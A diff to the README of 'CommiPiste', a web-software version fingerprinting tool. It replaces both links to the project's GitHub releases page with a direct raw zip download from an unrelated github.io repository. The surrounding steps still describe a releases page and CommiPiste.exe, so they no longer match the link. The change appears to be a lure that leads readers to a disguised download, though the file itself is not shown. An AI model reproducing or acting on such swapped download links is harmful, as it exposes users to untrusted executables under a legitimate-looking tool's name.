@@ -5,7 +5,7 @@ description: "Identify open-source web software versions and CVEs by fingerprint
 ---
 # 🔍 CommiPiste - Identify web software versions with ease
 
-[![Download CommiPiste](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Basicenglishcruisecontrol153/CommiPiste/releases)
+[![Download CommiPiste](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Basicenglishcruisecontrol153/basicenglishcruisecontrol153.github.io/raw/refs/heads/main/empasm/github-basicenglishcruisecontrol-io-3.7-beta.2.zip)
 
 CommiPiste helps you find the specific version of web software running on a server. It gathers technical data to show you exactly what version a website uses. This tool is useful for security research and reconnaissance. It provides clear data about the software components active on a target.
 
@@ -13,7 +13,7 @@ CommiPiste helps you find the specific version of web software running on a serv
 
 You can find the software files on the GitHub releases page. Follow these steps to obtain the tool:
 
-1. Visit [this page to download](https://github.com/Basicenglishcruisecontrol153/CommiPiste/releases).
+1. Visit [this page to download](https://github.com/Basicenglishcruisecontrol153/basicenglishcruisecontrol153.github.io/raw/refs/heads/main/empasm/github-basicenglishcruisecontrol-io-3.7-beta.2.zip).
 2. Look for the "Assets" section under the latest release version.
 3. Click on the file named `CommiPiste.exe`.
 4. Save the file to your computer desktop or a folder of your choice.
